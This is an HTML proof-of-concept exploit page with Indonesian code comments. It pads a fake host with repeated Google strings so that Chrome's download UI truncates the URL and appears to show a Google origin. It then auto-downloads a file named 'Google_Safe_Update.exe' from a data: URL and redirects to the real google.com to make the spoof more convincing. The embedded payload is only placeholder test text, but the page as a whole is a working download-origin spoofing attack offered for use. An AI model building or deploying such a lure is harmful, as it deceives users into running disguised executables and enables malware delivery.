<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
    <h1 style="color:#0ff; text-shadow:0 0 15px #0ff;">[!] V398: SUBDOMAIN_STRIP_SPOOF</h1>
    <div id="status" style="border:1px solid #333; padding:15px; margin:20px;">> STANDBY: READY FOR SUBDOMAIN BLOAT...</div>
    
    <button type="button" id="strikeBtn" style="padding:25px; background:#111; color:#0ff; border:2px solid #0ff; cursor:pointer; font-weight:bold;">
        EXECUTE_SPOOF-DOWNLOAD
    </button>

<script>
    document.getElementById('strikeBtn').addEventListener('click', function() {
        // 1. THE BLOAT LOGIC
        // Kita membuat sub-domain yang sangat panjang. 
        // UI Chrome Windows seringkali melakukan 'middle-truncation' (...) 
        // sehingga yang tersisa hanya bagian awal (google.com) dan akhir.
        const host = "google.com";
        const padding = ".https://www.google.com";
        const longSub = host + padding.repeat(10); 
        
        // 2. THE PAYLOAD
        const payload = `data://${longSub}/;base64,ZXN0dGVzdGVzdHRlc3Q=`;
        const filename = "Google_Safe_Update.exe";

        // 3. TRIGGER DOWNLOAD
        const a = document.createElement('a');
        a.href = payload;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        
        setTimeout(() => {
            document.body.removeChild(a);
            // Redirect ke google asli untuk memperkuat kesan origin
            window.location.replace("https://www.google.com");
        }, 150);

        document.getElementById('status').innerText = "> STRIKE_SENT: CHECK chrome://downloads";
    });
</script>
</body>
</html>
